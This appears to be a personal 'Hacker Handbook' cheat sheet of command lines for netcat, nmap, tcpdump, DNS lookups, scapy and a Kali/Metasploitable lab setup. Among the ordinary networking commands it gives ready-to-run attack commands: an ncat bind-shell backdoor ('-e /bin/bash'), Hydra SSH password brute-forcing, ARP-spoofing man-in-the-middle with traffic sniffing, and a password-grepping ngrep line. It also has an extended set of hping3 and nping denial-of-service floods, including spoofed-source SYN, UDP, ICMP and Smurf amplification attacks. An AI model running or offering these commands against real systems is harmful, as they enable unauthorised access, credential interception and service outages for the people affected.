# Hacker-Handbook
The "Hacker Handbook" 2021 (Work in progress)


----------------------------------------------------------------------------------------------------
(netcat or nc or ncat)

#Use Netcat as a Simple Web Server
vi index.html #make a simple HTML file
printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | netcat -l 8888 #
http://server_IP:8888 #access the content,serve the page, and then the netcat connection will close
"while true; do printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | netcat -l 8888; done" #have netcat serve the page indefinitely by wrapping the last command in an infinite loop

netcat -z -v domain.com 1-1000 #scan all ports up to 1000
netcat -z -n -v 198.51.100.0 1-1000 #-n flag to specify that you do not need to resolve the IP address using DNS
netcat -z -n -v 198.51.100.0 1-1000 2>&1 | grep succeeded #redirect standard error to standard output using the 2>&1 bash syntax. then filter the results with grep:

#gather more information about a service running on a system’s open port , known as banner grabbing 
nc -nvv x.x.x.x 80
nc u v w2 x.x.x.x 1-1024 #netcat used to perform a UDP scan of the lower 1024 ports
$ nc -l 8080 #listening to port 8080 for inbound connections

nc -vvul -p 9192 // listen UDP traffic
nc -vvl -p 8182 // listen TCP traffic

#listen UDP traffic on the port
$ nc -vvul -p 9192 & 
[3] 24622
$ Listening on [0.0.0.0] (family 0, port 9192)
#verify netcat is listening on the port
$ nc -vuz -w 3 0.0.0.0 9192 
XXXXXConnection to 0.0.0.0 9192 port [udp/*] succeeded!

$ ping 8.8.4.4 | nc -v 192.168.99.100 8182 // send traces to open a TCP port
$ ping 8.8.8.8 | nc -vu 192.168.99.100 9192 // send traces to an UDP port

// send traces to an UDP port without netcat
$ ping 8.8.4.4 > /dev/udp/192.168.99.100/9192 

// send traces to a TCP port without `netcat`
$ tail -f /opt/wso2esb01a/repository/logs/wso2carbon.log > /dev/tcp/192.168.99.100/8182
$ tail -f /opt/wiremock/wiremock.log | nc -vu 192.168.99.100 9192  #WireMock is a simulator for HTTP-based APIs. 
// send traces to an UDP port without `netcat`
$ tail -f /opt/wso2am02a/repository/logs/wso2carbon.log > /dev/udp/192.168.99.100/9192

$ nc -l 1234 > filename.out #Start by using nc to listen on a specific port, with output captured into a file
 $ nc host.example.com 1234 < filename.in #Using a second machine, connect to the listening nc process, feeding it the file which is to be transferred
$ netcat -l 4444 > received_file #instead of printing information onto the screen, place all of the information straight into a file
$ netcat domain.com 4444 < original_file # use this file as an input for the netcat connection we will establish to the listening computer. The file will be transmitted 

#On the receiving end, anticipate a file coming over that will need to be unzipped and extracted by typing
'netcat -l 4444 | tar xzvf -' #The ending dash (-) means that tar will operate on standard input, which is being piped from netcat across the network when a connection is made.
'tar -czf - * | netcat domain.com 444' # pack them into a tarball and then send them to the remote computer through netcat

$ nc -l -u 1234 #listening a udp port ‘1234’ , verify w sudo netstat -tunlp | grep 1234
$ nc -v -u 192.168.105.150 53 #send or test UDP port connectivity to a specific remote host

$ nc 192.168.1.100 80 #connection to server with IP address 192.168.1.100 will be made at port 80 & we can now send instructions
GET / HTTP/1.1 #get the page name
HEAD / HTTP/1.1 #get banner for OS fingerprinting

$ echo -n "GET / HTTP/1.0\r\n\r\n" | nc host.example.com 80 #retrieve the home page of a web site

#NC as chat tool
$ ncat -l 8080 #configure server to listen to a port & make connection to server from a remote machine on same port & start sending message
$ ncat SERVER_IP 8080 #On remote client machine

#NC as a proxy
#all the connections coming to our server on port 8080 will be automatically redirected to 192.168.1.200 server on port 80
$ ncat -l 8080 | ncat 192.168.1.200 80 #using a pipe, data can only be transferred & to be able to receive the data back
#create a two way pipe,send & receive data over nc proxy
$ mkfifo 2way
$ ncat -l 8080 0<2way | ncat 192.168.1.200 80 1>2way

$ ncat -l  8080 > file.txt #Start with machine on which data is to be received & start nc is listener mode
$ ncat 192.168.1.100 8080 --send-only < data.txt #on the machine from where data is to be copied, –send-only option will close the connection once the file has been copied

$ ncat -l 10000 -e /bin/bash #create a backdoor,‘e‘ flag attaches a bash to port 10000
$ ncat 192.168.1.100 1000 #a client can connect to port 10000 on server

$ nc -p 31337 -w 5 host.example.com 42 #Open a TCP connection to port 42 of host.example.com, using port 31337 as the source port, with a timeout of 5 seconds
$ nc -s 10.1.2.3 host.example.com 42 #Open a TCP connection to port 42 of host.example.com using 10.1.2.3 as the IP for the local end of the connection
$ nc -lU /var/tmp/dsocket #Create and listen on a Unix Domain Socket
$ nc -x10.2.3.4:8080 -Xconnect host.example.com 42 #Connect to port 42 of host.example.com via an HTTP proxy at 10.2.3.4, port 8080

   
$ ncat -u -l  80 -c  'ncat -u -l 8080' #all the connections for port 80 will be forwarded to port 8080
$ ncat -w 10 192.168.1.100 8080 #Listener mode in ncat will continue to run,configure timeouts with option ‘w’
$ ncat -l -k 8080 #When client disconnects from server, after sometime server also stops listening.force server to stay connected & continuing port listening with option ‘k’.
----------------------------------------------------------------------------------------------------
#when the user knows the format of requests required by the server.
#an email may be submitted to an SMTP server

$ nc localhost 25 << EOF
HELO host.example.com
MAIL FROM: <user@host.example.com>
RCPT TO: <user2@host.example.com>
DATA
Body of email.
.
QUIT
EOF
----------------------------------------------------------------------------------------------------
# it is necessary to first make a connection, and then break the connection when the banner has been retrieved. 
#This can be accomplished by specifying a small timeout with the -w flag
#or by issuing a "QUIT" command to the server

$ echo "QUIT" | nc host.example.com 20-30
SSH-1.99-OpenSSH_3.6.1p2
Protocol mismatch.
220 host.example.com IMS SMTP Receiver Version 0.84 Ready
----------------------------------------------------------------------------------------------------
#parallelized login cracker which supports numerous protocols to attack
hydra -L unix_users.txt -P unix_passwords.txt ssh://192.169.42.33
hydra -l user -P unix_passwords.txt ssh://192.169.42.33
hydra -l root -P root_userpass.txt ssh://192.169.42.33

----------------------------------------------------------------------------------------------------
#Web Content Scanner
dirb http://192.169.42.33 /usr/share/dirb/wordlists/common.txt
#web server scanner
nikto -host 192.169.42.33


#set mtu size 8
nmap --mtu 8 192.169.42.3 --packet_trace -n -p 80
nmap -p80 192.169.42.3 -oG -|nikto -h -
nmap -p0-65535 192.168.2.7
#network discovery scan with OS detction
nmap -O -PE 192.168.15.1/2
nmap -sO 62.233.173.90 para #IP protocol scan of a router and a typical Linux 2.4 box
nmap -PO 192.168.1.1 # do not ping before scanning 
nmap -sS 192.168.1.1 # Stealthy scan

nmap -sX -T2 linuxhint.com #Xmas scan Polite: -T2, neutral.
nmap -sX -T4 linuxhint.com #Xmas scan Aggressive: -T4, fast scan
nmap -sV -sX -T4 linuxhint.com #Xmas scan Aggressive: -T4, fast scan -sV for version detection on specific ports and distinguish between filtered and filtered ports,
#Iptables rules to block Xmas scan
iptables -A INPUT -p tcp --tcp-flags FIN,URG,PSH FIN,URG,PSH -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP

nmap -sN 192.168.100.11 #TCP Null scan Does not set any bits (TCP flag header is 0)
nmap -sF 192.168.100.11 #FIN scan (-sF) Sets just the TCP FIN bit.
nmap -sW -T4 docsrv.caldera.com #TCP Window Scan

#web vulnerability scanner
uniscan -u http://192.169.42.3 -qweds
ls /usr/share/uniscan/report/
192.169.42.3.html 

#set 5000 byte packet size
ping -l 5000 192.169.42.3 -n 1
#source routing
ping -j 192.169.42.3 8.8.8.8
#source routing  linux-based routers
sysctl -w net.ipv4.conf.<interface>.accept_source_route=1
#FreeBSD (pfSense) 
sysctls net.inet.ip.sourceroute and net.inet.ip.accept_sourceroute


tcpdump -X -vvv -n -i eth0
ssldump -A -d -i eth0

tcpdump -i eth1 ‘tcp[13] = 0x2'
tcpdump -i eth1 ‘tcp[13] = 0x12'

$ sudo tcpdump -tlni eth1 -n icmp
$ sudo tcpdump -i eth1 -c1 -n -s0 -vvvv icmp
tcpdump -tlni em0 
# listen for ICMP traffic on em0 network interface
tcpdump -tlni em0 -n icmp
# capture one ICMP packet and decode it
tcpdump -i nfe0 -c1 -n -s0 -vvvv icmp
sudo tcpdump -i eth1 -c1 -n -s0 -vvvv icmp -w temp.pcap

C:\Program Files\Wireshark>dumpcap -D
C:\Program Files\Wireshark>dumpcap -i 9
C:\Program Files\Wireshark>dumpcap -i 12 -w C:\Users\verona\Downloads\testtrace.pcapng -b filesize:2000

tcpdump -i eth0 -w dump.pcap
tcpdump src 192.168.2.3 and tcpport 80
dumpcap -i eth0 -w dump.pcapng
#searches either for the strings “pass” or “USER” on all packets going to/or coming from port 80 (TCP or UDP)
ngrep -q -d eth0 -W byline -wi "pass|USER" port 80 #The “-i” flag instructs ngrep to ignore case when matching

#HTTP Headers
tcpdump -vvvs 1024 -l -A host yahoo.com

#Show OSPF protocol traffic on the interface:
tcpdump -i eth-s1p1c0 proto ospf
#Show Telnet traffic on the interface:
tcpdump -i eth-s1p1c0 port telnet
tcpudmp -i eth-s1p1c0 port 23
tcpdump -i eth-s2p1c0 udp port 68 
#Show all traffic on the interface except port 80:
tcpdump -i eth-s1p1c0 not port 80
#Show traffic only from specific host:
tcpdump -i eth-s1p1c0 host 192.168.10.24
#Show additional information about each packet:
tcpdump -vv -i eth-s1p1c0
#Limit the size (in bytes) of captured packets 
tcpdump -s 320 -i eth-s1p1c0

#Saving a TCP dump in a .pcap file
tcpdump -w capture.pcap -i eth-s1p2c0 host 10.1.1.1 and host 20.2.2.2
tcpdump -nni any host 10.1.1.1 -w capture.pcap
tcpdump -nni any host 10.1.1.1 and host 20.2.2.2 -w capture.pcap
tcpdump -s 1500 -i eth-s1p1c0 -w /var/log/tcpdump_s1p1c0.cap

#Saving a TCP dump in a .pcap file
tcpdump -w capture.pcap -i eth-s1p2c0 host 10.1.1.1 and host 20.2.2.2
tcpdump -nni any host 10.1.1.1 -w capture.pcap
tcpdump -nni any host 10.1.1.1 and host 20.2.2.2 -w capture.pcap
tcpdump -s 1500 -i eth-s1p1c0 -w /var/log/tcpdump_s1p1c0.cap

#Saving fw monitor logs to a .pcap file to analyse in wireshark
#Use WinSCP to access the Security Gateway and copy the file to your local drive to analyze it in Wireshark
fw monitor -e 'accept (src=10.1.1.1 and dst=20.2.2.2) or (src=20.2.2.2 and dst=10.1.1.1);' -m iIoO -o wireshark.pcap
fw monitor -e 'accept (src=192.167.4.244 and dst=193.140.12.215) or (src=193.140.12.215 and dst=192.167.4.244 );' -m iIoO -o wireshark1.pcap

start Wireshark from the command line.
$ wireshark -r test.pcap

#scenario #1
#machine acts as a router    
sysctl -w net.ipv4.ip_forward=1
arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
arpspoof -i wlan0 -t 192.000.000.52 192.000.000.1
arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]
arpspoof -i wlan0 -t 192.000.000.1 192.000.000.52
#listens to network traffic and picks out images from TCP streams it observes
driftnet -i [Network Interface Name]
#sniffs HTTP requests in Common Log Format
urlsnarf -i [Network interface name]


#ICMP redirect MITM attack
/etc/sysctl.conf
net.ipv4.conf.all.accept_redirects = 0
hping3 -I eth0 -C 5 -K 1 -a 10.0.2.2 --icmp-ipdst 8.8.8.8 --icmp-gw 10.0.2.15 --icmp-ipsrc 10.0.2.16

#operating system detection w ICMP packages
hping3 -1 -c 1 –K 58 10.0.2.16
hping3 -a 10.1.1.1 -p 80 -S www.alibaba.com
hping3 -S 192.168.1.105 -p 80
hping -S 192.168.1.105 -p ++1
hping3 -f 192.168.1.105 -p 80

   
# -d is the data payload size (here, we've designated it as 10 bytes)
# -E tells hping3 to grab data from the following file
hping3 -f 192.168.1.105 -p 80 -d 10 -E malware

# -z connects the command to the ctrl z on the keyboard so that every time we press it, the TTL is incremented by 1
# -t sets the initial TTL (in this case, we're using 1)
# -S sets the flag to SYN
# -p 80 sets the destination port to 80
hping3 -z -t 1 -S google.com -p 80
    


DoS using hping3 with random source IP
-c 100000 = Number of packets to send.
-d 120 = Size of each packet that was sent to target machine.
-S = I am sending SYN packets only.
-w 64 = TCP window size.
-p 21 = Destination port (21 being FTP port). You can use any port here.
--flood = Sending packets as fast as possible, without taking care to show incoming replies. Flood mode.
--rand-source = Using Random Source IP Addresses. You can also use -a or –spoof to hide hostnames. See MAN page below.
www.hping3testsite.com = Destination IP address/website name 
$hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com

#SYN flood – DoS using HPING3
hping3 -S --flood -V www.hping3testsite.com

Advanced SYN flood with random source IP, different data size, and window size
hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
–flood: sent packets as fast as possible
–rand-source: random source address
-c –count: packet count
-d –data: data size
-S –syn: set SYN flag
-w –win: winsize (default 64)
-p –destport: destination port (default 0)
$hping3 -S --flood -V -p TARGET_PORT TARGET_SITE


FIN floods
$hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP
TCP RST Flood
$hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP
PUSH and ACK Flood
$hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP
ICMP flood
$hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP
UDP Flood
–flood: sent packets as fast as possible
–rand-source: random source address
–udp: UDP mode
-p –destport: destination port (default 0)
$hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP
SYN flood with spoofed IP – DoS using HPING3
$hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
TCP connect flood – DoS using NPING
$nping --tcp-connect -rate=90000 -c 900000 -q www.hping3testsite.com    
    
    
use routers broadcast IP address feature to send messages to multiple IP addresses 
use connection-less protocols that do not validate source IP addresses.
amplification techniques;Smurf attack(ICMP amplification), DNS amplification, and Fraggle attack(UDP amplification)
    

Smurf Attack
This command sends ping requests to broadcast IP(10.10.15.255) by spoofing target IP(10.10.15.152). 
All running hosts in this network reply to the target.
$hping3 --icmp --spoof TARGET_IP BROADCAST_IP
$hping3 --icmp --spoof 10.10.15.152 10.10.15.255

DNS lookups
$ whois www.alibaba.com

dig www.alibaba.com ANY +noall +answer
#Find Out TTL Value Using dig
dig +nocmd +noall +answer a www.alibaba.com
#Find Domain SOA Record
$ dig +nssearch www.alibaba.com
#Display All Records
$ dig +noall +answer www.alibaba.com any
#Get Only Short Answer
$ dig +short www.alibaba.com
#Trace Domain Delegation Path
$ dig +trace www.alibaba.com
$ dig -x 217.168.240.132
$ dig +noall +answer -x 217.168.240.132
$ dig -x 193.140.80.208 +short 
$ dig -x 193.140.80.208 +trace
check if your mail servers direct correctly
$dig your_domain_name.com MX
check if "A" records are set correctly
$dig your_domain_name.com


Get TTL Information
$ host -v -t {TYPE} {example.com}
host -t any www.alibaba.com
Find Out the Domain IP
$ host -v -t a cyberciti.biz
Find Out the Domain Mail Server
$ host -v -t mx cyberciti.biz
$ host -v -t soa cyberciti.biz
Find Out the Domain Name Servers
$ host -v -t ns cyberciti.biz
$ host -a www.alibaba.com
Find Out the Domain CNAME Record
$ host -t cname files.cyberciti.biz
Query Particular Name Server
$ host www.alibaba.com ns1.www.alibaba.com
Find Out the Domain TXT Recored (e.g. SPF)
$ host -t txt www.alibaba.com
Reverse DNS lookup 
$host 217.168.240.132
$host -v -t ptr 75.126.153.206
#FW trick
#By default, host command uses UDP protocol,Pass the -T option to use a TCP connection when querying the name server. 
#see if the name server works over TCP and firewall allows queries over the TCP
host -t cname files.cyberciti.biz



#change the default timeout to wait for a reply using -timeout option.
nslookup -timeout=10 redhat.com	
nslookup -debug redhat.com
nslookup -type=any www.alibaba.com
#By default DNS servers uses the port number 53. If the port number changes
nslookup -port 56 redhat.com
specify a particular name server to resolve the domain name, ns1.redhat.com as the DNS server, ns1.redhat.com has all the zone information of redhat.com
nslookup redhat.com ns1.redhat.com
#view all the available DNS records using -query=any option.
nslookup -type=any google.com
nslookup 217.168.240.132



look up geolocation from the command line
$ curl ipinfo.io/23.66.166.151 

$ sudo yum install GeoIP GeoIP-data
$ geoiplookup 8.8.4.4
set this up as a cron:
$ /usr/bin/geoipupdate

============================================================================
download Kali Linux 64-bit VirtualBox 
https://www.kali.org/downloads

File - Import Appliance - Import
import kali-linux-2019.3a-vbox-amd64.ova
u/p root/toor
download Metasploitable 2
https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide
Create a new VM for Metasploitable 2
u/p msfadmin/msfadmin

Create a network
File - Preferences - Network; Supports DHCP

Config VMs network 
Settings - Network - Attached to - NAT Network 

============================================================================
Scapy to perform layer 2 discovery
# scapy
>>> ARP().display()
>>> arp_request1 = ARP()
>>> arp_request1.pdst = "192.168.2.11"
>>> arp_request1.display()
>>> sr1(arp_request1)
>>> sr1(ARP(pdst="192.168.2.11"))
============================================================================
$ sec -conf=root_login_attempts.conf -input=-
# root_login_attempts.conf sec rule 
type=Single
ptype=RegExp
pattern=Failed password for root
desc=Matched: $0
action=logonly
============================================================================
Listen to the interface and print a single packet
netsniff-ng --num 1 --in eth1
Write traffic coming in on eth0 to dump.pcap and don't print any output. 
netsniff-ng --in eth0 --out dump.pcap --silent --bind-cpu 0
write a new pcap to the /mypcaps directory each day
netsniff-ng --in eth0 --out /mypcaps --interval 24hrs
send packets from eth0 to eth1
netsniff-ng --in eth0 --out eth1 --mmap --silent --prio-high
replay a network trace to an IDS listening on eth0 or attached to a hub
netsniff-ng --in dump.pcap --mmap --out eth0 -k1000 --silent --bind-cpu 1
Apply a BPF filter, print matched packets in ASCII, accept jumbo frames, and increase verbosity:
netsniff-ng --in any --filter http.bpf --jumbo-support --ascii -V
Write new file every 10 seconds to the current directory and print packet statistics for every interval by specifying verbose mode
netsniff-ng --in any -s --out . --interval 10sec -V
Write a low-level BPF filter with bpfc and then pass to netsniff-ng
$ bpfc -i sample_bpf.txt > ethernet.bpfc
$ netsniff-ng --in eth0 --out ethernet.pcap --filter ethernet.bpfc
Use tcpdump to dump BPF filter opcodes to file and pass to netsniff-ng
tcpdump -dd 'ip src 192.168.1.1 and tcp and port (53 or 80 or 443)' > myfilter.bpf
netsniff-ng --in eth0 --filter myfilter.bpf --ascii
Create a trafgen configuration file from a pcap and generate it out eth1 in random order.
netsniff-ng --in ns-ng.pcap --out ns-ng.cfg -s
trafgen --in ns-ng.cfg --out eth1 --rand

============================================================================
MBHudson
